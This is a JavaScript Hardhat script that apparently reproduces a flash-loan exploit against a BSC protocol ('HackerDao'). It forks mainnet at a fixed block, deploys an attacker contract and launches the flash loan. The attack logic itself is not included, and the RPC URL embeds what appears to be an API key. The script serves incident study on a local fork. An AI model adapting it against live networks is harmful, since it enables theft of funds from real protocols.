// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  // const Greeter = await hre.ethers.getContractFactory("Greeter");
  // const greeter = await Greeter.deploy("Hello, Hardhat!");

  // await greeter.deployed();

  // console.log("Greeter deployed to:", greeter.address);

  await network.provider.request({
    method: "hardhat_reset",
    params: [{
      forking: {
        jsonRpcUrl: "https://bsc-mainnet.nodereal.io/v1/1005333b090f46aa9edb747e3fa5235a",
        blockNumber: 18073756
      }
    }]
  })
  
  
  const [attacker] = await ethers.getSigners();

  const Exploit = await hre.ethers.getContractFactory("HackerDaoAttacker");
  const exploit = await Exploit.deploy();

  await exploit.deployed();

  console.log("exploit deployed to:", exploit.address);

  await exploit.startFlashLoan();


  // const [attacker] = await ethers.getSigners();

  // const Exploit = await hre.ethers.getContractFactory("Exploit");
  // const exploit = await Exploit.deploy();

  // await exploit.deployed();

  // console.log("exploit deployed to:", exploit.address);

  // await exploit.exp();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
